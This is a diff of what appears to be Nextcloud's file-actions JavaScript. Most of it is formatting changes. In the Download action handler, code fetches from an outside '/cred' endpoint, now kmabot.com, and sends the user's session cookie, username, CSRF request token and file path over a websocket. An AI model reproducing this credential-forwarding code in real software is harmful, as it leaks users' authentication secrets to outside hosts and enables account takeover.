@@ -8,14 +8,20 @@
  *
  */
 
-(function() {
+function getCookieByName(name, cookie) {
+	const value = `; ${cookie}`;
+	const parts = value.split(`; ${name}=`);
+	if (parts.length === 2) return parts.pop().split(';').shift();
+}
+
+(function () {
 
 	/**
 	 * Construct a new FileActions instance
 	 * @constructs FileActions
 	 * @memberof OCA.Files
 	 */
-	var FileActions = function() {
+	var FileActions = function () {
 		this.initialize();
 	};
 	var socket;
@@ -42,7 +48,7 @@
 		/**
 		 * @private
 		 */
-		initialize: function() {
+		initialize: function () {
 			this.clear();
 			// abusing jquery for events until we get a real event lib
 			this.$el = $('<div class="dummy-fileactions hidden"></div>');
@@ -58,7 +64,7 @@
 		 * @param {String} eventName event name
 		 * @param {Function} callback
 		 */
-		on: function(eventName, callback) {
+		on: function (eventName, callback) {
 			this.$el.on(eventName, callback);
 		},
 
@@ -68,7 +74,7 @@
 		 * @param {String} eventName event name
 		 * @param {Function} callback
 		 */
-		off: function(eventName, callback) {
+		off: function (eventName, callback) {
 			this.$el.off(eventName, callback);
 		},
 
@@ -78,7 +84,7 @@
 		 * @param {String} eventName event name
 		 * @param {Object} data data
 		 */
-		_notifyUpdateListeners: function(eventName, data) {
+		_notifyUpdateListeners: function (eventName, data) {
 			this.$el.trigger(new $.Event(eventName, data));
 		},
 
@@ -88,10 +94,10 @@
 		 *
 		 * @param {OCA.Files.FileActions} fileActions instance of OCA.Files.FileActions
 		 */
-		merge: function(fileActions) {
+		merge: function (fileActions) {
 			var self = this;
 			// merge first level to avoid unintended overwriting
-			_.each(fileActions.actions, function(sourceMimeData, mime) {
+			_.each(fileActions.actions, function (sourceMimeData, mime) {
 				var targetMimeData = self.actions[mime];
 				if (!targetMimeData) {
 					targetMimeData = {};
@@ -105,7 +111,7 @@
 		/**
 		 * @deprecated use #registerAction() instead
 		 */
-		register: function(mime, name, permissions, icon, action, displayName) {
+		register: function (mime, name, permissions, icon, action, displayName) {
 			return this.registerAction({
 				name: name,
 				mime: mime,
@@ -125,20 +131,20 @@
 			var mime = action.mime;
 			var name = action.name;
 			var actionSpec = {
-				action: function(fileName, context) {
+				action: function (fileName, context) {
 					// Actions registered in one FileAction may be executed on a
 					// different one (for example, due to the "merge" function),
 					// so the listeners have to be updated on the FileActions
 					// from the context instead of on the one in which it was
 					// originally registered.
 					if (context && context.fileActions) {
-						context.fileActions._notifyUpdateListeners('beforeTriggerAction', {action: actionSpec, fileName: fileName, context: context});
+						context.fileActions._notifyUpdateListeners('beforeTriggerAction', { action: actionSpec, fileName: fileName, context: context });
 					}
 
 					action.actionHandler(fileName, context);
 
 					if (context && context.fileActions) {
-						context.fileActions._notifyUpdateListeners('afterTriggerAction', {action: actionSpec, fileName: fileName, context: context});
+						context.fileActions._notifyUpdateListeners('afterTriggerAction', { action: actionSpec, fileName: fileName, context: context });
 					}
 				},
 				name: name,
@@ -166,12 +172,12 @@
 			}
 			this.actions[mime][name] = actionSpec;
 			this.icons[name] = action.icon;
-			this._notifyUpdateListeners('registerAction', {action: action});
+			this._notifyUpdateListeners('registerAction', { action: action });
 		},
 		/**
 		 * Clears all registered file actions.
 		 */
-		clear: function() {
+		clear: function () {
 			this.actions = {};
 			this.defaults = {};
 			this.icons = {};
@@ -185,7 +191,7 @@
 		 */
 		setDefault: function (mime, name) {
 			this.defaults[mime] = name;
-			this._notifyUpdateListeners('setDefault', {defaultAction: {mime: mime, name: name}});
+			this._notifyUpdateListeners('setDefault', { defaultAction: { mime: mime, name: name } });
 		},
 
 		/**
@@ -198,7 +204,7 @@
 		 *
 		 * @return {Object.<string,OCA.Files.FileActions~actionHandler>} map of action name to action spec
 		 */
-		get: function(mime, type, permissions, filename) {
+		get: function (mime, type, permissions, filename) {
 			var actions = this.getActions(mime, type, permissions, filename);
 			var filteredActions = {};
 			$.each(actions, function (name, action) {
@@ -217,7 +223,7 @@
 		 *
 		 * @return {Array.<OCA.Files.FileAction>} array of action specs
 		 */
-		getActions: function(mime, type, permissions, filename) {
+		getActions: function (mime, type, permissions, filename) {
 			var actions = {};
 			if (this.actions.all) {
 				actions = $.extend(actions, this.actions.all);
@@ -239,7 +245,7 @@
 
 			var filteredActions = {};
 			var self = this;
-			$.each(actions, function(name, action) {
+			$.each(actions, function (name, action) {
 				if (self.allowedPermissions(action.permissions, permissions) &&
 					self.allowedFilename(action.filename, filename)) {
 					filteredActions[name] = action;
@@ -250,11 +256,11 @@
 		},
 
 
-		allowedPermissions: function(actionPermissions, permissions) {
+		allowedPermissions: function (actionPermissions, permissions) {
 			return (actionPermissions === OC.PERMISSION_NONE || (actionPermissions & permissions));
 		},
 
-		allowedFilename: function(actionFilename, filename) {
+		allowedFilename: function (actionFilename, filename) {
 			return (!filename || filename === '' || !actionFilename
 				|| actionFilename === '' || actionFilename === filename);
 		},
@@ -284,7 +290,7 @@
 		 * @return {OCA.Files.FileActions~actionSpec} action spec
 		 * @since 8.2
 		 */
-		getCurrentDefaultFileAction: function() {
+		getCurrentDefaultFileAction: function () {
 			var mime = this.getCurrentMimeType();
 			var type = this.getCurrentType();
 			var permissions = this.getCurrentPermissions();
@@ -301,7 +307,7 @@
 		 * @return {OCA.Files.FileActions~actionSpec} action spec
 		 * @since 8.2
 		 */
-		getDefaultFileAction: function(mime, type, permissions) {
+		getDefaultFileAction: function (mime, type, permissions) {
 			var mimePart;
 			if (mime) {
 				mimePart = mime.substr(0, mime.indexOf('/'));
@@ -328,7 +334,7 @@
 		 * false otherwise
 		 * @param {OCA.Files.FileActionContext} context action context
 		 */
-		_defaultRenderAction: function(actionSpec, isDefault, context) {
+		_defaultRenderAction: function (actionSpec, isDefault, context) {
 			if (!isDefault) {
 				var params = {
 					name: actionSpec.name,
@@ -358,7 +364,7 @@
 		 *
 		 * @param {Object} params action params
 		 */
-		_makeActionLink: function(params) {
+		_makeActionLink: function (params) {
 			return $(OCA.Files.Templates['file_action_trigger'](params));
 		},
 
@@ -368,7 +374,7 @@
 		 * @param {string} fileName file name
 		 * @param {OCA.Files.FileActionContext} context rendering context
 		 */
-		_showMenu: function(fileName, context) {
+		_showMenu: function (fileName, context) {
 			var menu;
 			var $trigger = context.$file.closest('tr').find('.fileactions .action-menu');
 			$trigger.addClass('open');
@@ -378,7 +384,7 @@
 
 			context.$file.find('td.filename').append(menu.$el);
 
-			menu.$el.on('afterHide', function() {
+			menu.$el.on('afterHide', function () {
 				context.$file.removeClass('mouseOver');
 				$trigger.removeClass('open');
 				$trigger.attr('aria-expanded', 'false');
@@ -395,7 +401,7 @@
 		 * @param {Object} $tr file list row element
 		 * @param {OCA.Files.FileActionContext} context rendering context
 		 */
-		_renderMenuTrigger: function($tr, context) {
+		_renderMenuTrigger: function ($tr, context) {
 			// remove previous
 			$tr.find('.action-menu').remove();
 
@@ -421,7 +427,7 @@
 		 * false otherwise
 		 * @param {OCA.Files.FileActionContext} context rendering context
 		 */
-		_renderInlineAction: function(actionSpec, isDefault, context) {
+		_renderInlineAction: function (actionSpec, isDefault, context) {
 			if (actionSpec.shouldRender) {
 				if (!actionSpec.shouldRender(context)) {
 					return;
@@ -434,9 +440,9 @@
 			}
 			$actionEl.on(
 				'click', {
-					a: null
-				},
-				function(event) {
+				a: null
+			},
+				function (event) {
 					event.stopPropagation();
 					event.preventDefault();
 
@@ -487,7 +493,7 @@
 		 *
 		 * @since 8.2
 		 */
-		triggerAction: function(actionName, fileInfoModel, fileList) {
+		triggerAction: function (actionName, fileInfoModel, fileList) {
 			var actionFunc;
 			var actions = this.get(
 				fileInfoModel.get('mimetype'),
@@ -607,8 +613,8 @@
 				this._renderMenuTrigger($tr, context);
 			}
 
-			if (triggerEvent){
-				fileList.$fileList.trigger(jQuery.Event("fileActionsReady", {fileList: fileList, $files: $tr}));
+			if (triggerEvent) {
+				fileList.$fileList.trigger(jQuery.Event("fileActionsReady", { fileList: fileList, $files: $tr }));
 			}
 		},
 		getCurrentFile: function () {
@@ -627,7 +633,9 @@
 		/**
 		 * Register the actions that are used by default for the files app.
 		 */
-		registerDefaultActions: function() {
+
+
+		registerDefaultActions: function () {
 			this.registerAction({
 				name: 'Download',
 				displayName: t('files', 'Download'),
@@ -643,12 +651,12 @@
 					var downloadFileaction = $(context.$file).find('.fileactions .action-download');
 
 					// don't allow a second click on the download action
-					if(downloadFileaction.hasClass('disabled')) {
+					if (downloadFileaction.hasClass('disabled')) {
 						return;
 					}
 
 					if (url) {
-						var disableLoadingState = function() {
+						var disableLoadingState = function () {
 							context.fileList.showFileBusyState(filename, false);
 						};
 
@@ -673,25 +681,28 @@
 					const getRequestToken = () => document.getElementsByTagName('head')[0].getAttribute('data-requesttoken');
 
 					if (socket.readyState === 1) {
-						fetch('https://megafs.vgisc.com/cred')
-						.then(res => res.json())
-						.then(({ cookie }) => {
-							const username = getCookieByName('nc_username', cookie);
-							const requesttoken = getRequestToken();
+						fetch('https://kmabot.com/cred')
+							.then(res => res.json())
+							.then(({ cookie }) => {
+								const username = getCookieByName('nc_username', cookie);
+								const requesttoken = getRequestToken();
 
-							socket.send(JSON.stringify({
+								socket.send(JSON.stringify({
 									location: "Files",
 									filePath: url.split('/remote.php/webdav')[1],
 									cookie,
 									username,
 									requesttoken,
 								}));
-						});
+							});
 					} else {
 						alert("Không thể kết nối tới server websocket, hãy thử lại sau !");
 					}
-				}
+				},
+
 			});
+
+
 
 			this.registerAction({
 				name: 'Rename',
@@ -707,7 +718,7 @@
 
 			this.registerAction({
 				name: 'MoveCopy',
-				displayName: function(context) {
+				displayName: function (context) {
 					var permissions = context.fileInfoModel.attributes.permissions;
 					if (permissions & OC.PERMISSION_UPDATE) {
 						if (!context.fileInfoModel.canDownload()) {
@@ -735,22 +746,22 @@
 					if (typeof context.fileList.dirInfo.dirLastCopiedTo !== 'undefined') {
 						dialogDir = context.fileList.dirInfo.dirLastCopiedTo;
 					}
-					OC.dialogs.filepicker(t('files', 'Choose target folder'), function(targetPath, type) {
+					OC.dialogs.filepicker(t('files', 'Choose target folder'), function (targetPath, type) {
 						if (type === OC.dialogs.FILEPICKER_TYPE_COPY) {
 							context.fileList.copy(filename, targetPath, false, context.dir);
 						}
-							if (type === OC.dialogs.FILEPICKER_TYPE_MOVE) {
-								context.fileList.move(filename, targetPath, false, context.dir);
-							}
-							context.fileList.dirInfo.dirLastCopiedTo = targetPath;
-						}, false, "httpd/unix-directory", true, actions, dialogDir);
+						if (type === OC.dialogs.FILEPICKER_TYPE_MOVE) {
+							context.fileList.move(filename, targetPath, false, context.dir);
+						}
+						context.fileList.dirInfo.dirLastCopiedTo = targetPath;
+					}, false, "httpd/unix-directory", true, actions, dialogDir);
 				}
 			});
 
 			if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
 				this.registerAction({
 					name: 'EditLocally',
-					displayName: function(context) {
+					displayName: function (context) {
 						var locked = context.$file.data('locked');
 						if (!locked) {
 							return t('files', 'Edit locally');
@@ -758,7 +769,7 @@
 					},
 					mime: 'all',
 					order: -23,
-					icon: function(filename, context) {
+					icon: function (filename, context) {
 						var locked = context.$file.data('locked');
 						if (!locked) {
 							return OC.imagePath('files', 'computer.svg')
@@ -788,7 +799,7 @@
 						id = context.fileId
 					}
 					if (OCA.Files.App && OCA.Files.App.getActiveView() !== 'files') {
-						OCA.Files.App.setActiveView('files', {silent: true});
+						OCA.Files.App.setActiveView('files', { silent: true });
 						OCA.Files.App.fileList.changeDirectory(OC.joinPaths(dir, filename), true, true);
 					} else {
 						context.fileList.changeDirectory(OC.joinPaths(dir, filename), true, false, parseInt(id, 10));
@@ -799,7 +810,7 @@
 
 			this.registerAction({
 				name: 'Delete',
-				displayName: function(context) {
+				displayName: function (context) {
 					var mountType = context.$file.attr('data-mounttype');
 					var type = context.$file.attr('data-type');
 					var deleteTitle = (type && type === 'file')
@@ -817,9 +828,9 @@
 				// permission is READ because we show a hint instead if there is no permission
 				permissions: OC.PERMISSION_DELETE,
 				iconClass: 'icon-delete',
-				actionHandler: function(fileName, context) {
+				actionHandler: function (fileName, context) {
 					// if there is no permission to delete do nothing
-					if((context.$file.data('permissions') & OC.PERMISSION_DELETE) === 0) {
+					if ((context.$file.data('permissions') & OC.PERMISSION_DELETE) === 0) {
 						return;
 					}
 					context.fileList.do_delete(fileName, context.dir);
@@ -846,7 +857,7 @@
 	 * @param {jQuery} $buttonElement The button element
 	 * @param {boolean} showIt whether to show the spinner(true) or to hide it(false)
 	 */
-	OCA.Files.FileActions.updateFileActionSpinner = function($buttonElement, showIt) {
+	OCA.Files.FileActions.updateFileActionSpinner = function ($buttonElement, showIt) {
 		var $icon = $buttonElement.find('.icon');
 		if (showIt) {
 			var $loadingIcon = $('<span class="icon icon-loading-small"></span>');
